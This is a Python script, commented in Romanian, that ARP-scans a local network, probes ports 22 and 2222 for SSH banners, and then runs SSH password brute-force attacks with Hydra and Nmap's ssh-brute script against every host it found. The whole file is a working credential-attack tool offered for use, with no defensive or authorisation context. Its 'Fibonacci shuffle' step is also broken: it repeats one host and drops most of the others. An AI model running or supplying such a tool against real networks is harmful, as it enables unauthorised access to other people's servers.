import scapy.all as scapy
import socket
import subprocess
import os
from concurrent.futures import ThreadPoolExecutor

# 1. Scanarea rețelei pentru IP-uri active
def scan_network(network):
    try:
        arp_request = scapy.ARP(pdst=network)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        ip_list = [element[1].psrc for element in answered_list]
        return ip_list
    except Exception as e:
        print(f"Error scanning network: {e}")
        return []

# 2. Salvarea IP-urilor active într-un fișier
def save_ips_to_file(ip_list, filename):
    try:
        with open(filename, 'w') as file:
            for ip in ip_list:
                file.write(ip + "\n")
    except IOError as e:
        print(f"Error saving IPs to file: {e}")

# 3. Sortarea IP-urilor și eliminarea duplicatelor
def sort_and_deduplicate_ips(filename):
    try:
        with open(filename, 'r') as file:
            ips = file.readlines()
        ips = list(set(ips))  # Eliminarea duplicatelor
        ips.sort()  # Sortare
        return ips
    except IOError as e:
        print(f"Error reading IPs from file: {e}")
        return []

# 4. Amestecarea IP-urilor folosind un algoritm Fibonacci
def fibonacci_shuffle(ips):
    try:
        fib_sequence = [0, 1]
        while len(fib_sequence) < len(ips):
            fib_sequence.append(fib_sequence[-1] + fib_sequence[-2])
        shuffled_ips = [ips[i] for i in fib_sequence if i < len(ips)]
        return shuffled_ips
    except Exception as e:
        print(f"Error shuffling IPs: {e}")
        return ips

# 5. Scanarea IP-urilor pentru serviciul SSH folosind thread pool
def check_ssh_service(ip_list, ports):
    ssh_ips = []
    def check_ip(ip):
        nonlocal ssh_ips
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip.strip(), port))
                if result == 0:
                    banner = ""
                    try:
                        sock.send(b"SSH-")
                        banner = sock.recv(1024).decode('utf-8').strip()
                    except:
                        pass
                    ssh_ips.append((ip.strip(), port, banner))
                sock.close()
            except Exception as e:
                print(f"Error checking SSH service on {ip.strip()}: {e}")
    
    try:
        with ThreadPoolExecutor(max_workers=50) as executor:
            executor.map(check_ip, ip_list)
    except Exception as e:
        print(f"Error using thread pool: {e}")
    
    return ssh_ips

# 6. Salvarea bannerelor SSH într-un fișier
def save_ssh_output(ssh_ips, output_filename):
    try:
        with open(output_filename, 'w') as file:
            for ip, port, banner in ssh_ips:
                file.write(f"IP: {ip}, Port: {port}, Banner: {banner}\n")
    except IOError as e:
        print(f"Error saving SSH output to file: {e}")

# 7. Utilizare Hydra pentru scanare brută
def hydra_scan(ip_list):
    try:
        temp_file = "temp_ips.txt"
        save_ips_to_file(ip_list, temp_file)
        subprocess.run(["hydra", "-L", "users.txt", "-P", "passwords.txt", "-M", temp_file, "ssh"], check=True)
        os.remove(temp_file)
    except subprocess.CalledProcessError as e:
        print(f"Hydra scan failed: {e}")
    except Exception as e:
        print(f"Error during Hydra scan: {e}")

# 8. Utilizare Nmap pentru scanare brută
def nmap_scan(ip_list):
    try:
        temp_file = "temp_ips_nmap.txt"
        save_ips_to_file(ip_list, temp_file)
        subprocess.run(["nmap", "-p", "22", "--script", "ssh-brute", "-iL", temp_file], check=True)
        os.remove(temp_file)
    except subprocess.CalledProcessError as e:
        print(f"Nmap scan failed: {e}")
    except Exception as e:
        print(f"Error during Nmap scan: {e}")

if __name__ == "__main__":
    network = "192.168.1.0/24"
    
    # Pasul 1: Scanare rețea
    ip_list = scan_network(network)
    
    # Pasul 2: Salvare IP-uri într-un fișier
    save_ips_to_file(ip_list, "ips_alive.txt")
    
    # Pasul 3: Sortare și eliminare duplicate
    sorted_ips = sort_and_deduplicate_ips("ips_alive.txt")
    
    # Pasul 4: Amestecare IP-uri
    shuffled_ips = fibonacci_shuffle(sorted_ips)
    
    # Pasul 5: Scanare SSH folosind thread pool
    ssh_ports = [22, 2222]  # Exemplu de porturi SSH
    ssh_ips = check_ssh_service(shuffled_ips, ssh_ports)
    
    # Pasul 6: Salvare output SSH
    save_ssh_output(ssh_ips, "ssh_output.txt")
    
    # Pasul 7: Scanare brută cu Hydra și Nmap în paralel
    half = len(shuffled_ips) // 2
    with ThreadPoolExecutor(max_workers=2) as executor:
        executor.submit(hydra_scan, shuffled_ips[:half])
        executor.submit(nmap_scan, shuffled_ips[half:])
